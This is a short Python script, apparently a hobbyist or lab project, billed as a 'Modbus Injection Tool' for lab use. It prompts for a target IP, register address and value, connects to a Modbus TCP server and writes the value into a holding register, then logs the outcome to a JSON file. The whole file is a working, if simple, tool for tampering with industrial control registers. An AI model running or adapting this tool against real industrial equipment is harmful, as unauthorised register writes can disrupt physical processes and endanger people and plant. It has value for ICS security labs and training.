#!/usr/bin/env python3 this is a simple script based off of Mike Holcoms snowcrash
import json
import datetime
import os
from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusException


#get user input 
ip = input("Target IP: ") # for my test use the local loopback address
address = int(input("Register address: "))
value_raw = input("Value (if applicable, press Enter to skip): ")
value = int(value_raw) if value_raw.strip() else None
output = input("Output file name is (if applicable): ")

# setup the json log entry template
log_entry = {
        "ip": ip,
        
        "write_count": 1,
        "address": address,
        "value": value,
        "output": output
    }

# this sees if i can connect to the modbus server 
def test_connection(client, ip,):
    if client.connect():
        print(f"Successfully connected to Modbus server at {ip}")
    
        return True
    else:
        print(f"Failed to connect to Modbus server at {ip}")
        return False
    


def write_single_register(client, address, value,):
    print(f"Writing value {value} to register {address}...")
    result = client.write_register(address, value,)
    if result.isError():
        print("Error writing to register.")
        return False
    else:
        print(f"Successfully wrote value {value} to register {address}.")
        return True

def write_log(entry, filename):
    if not filename:
        return
    entry["timestamp"] = datetime.datetime.now().isoformat()
    try:
        if not os.path.exists(filename):
            with open(filename, "w") as f:
                json.dump([entry], f, indent=2)
        else:
            with open(filename, "r") as f:
                try:
                    data = json.load(f)
                    if not isinstance(data, list):
                        data = [data]
                except json.JSONDecodeError:
                    data = []

            data.append(entry)

            with open(filename, "w") as f:
                json.dump(data, f, indent=2)
    except Exception as e:
        print(f"Failed to write to log file: {e}")
if __name__ == "__main__":
    print("[*] Hydrophobic - Modbus Injection Tool")
    print("[*] For lab use only\n")
    
    client = ModbusTcpClient(ip, port=5020)
    
    try:
        if test_connection(client, ip):
            log_entry["status"] = "connected"
            
            if write_single_register(client, address, value):
                log_entry["result"] = "write_success"
            else:
                log_entry["result"] = "write_failed"
        else:
            log_entry["status"] = "connection_failed"

    except ModbusException as e:
        print(f"[!] Modbus error: {e}")
        log_entry["error"] = str(e)

    finally:
        write_log(log_entry, output)
        client.close()
        print(" Connection closed.")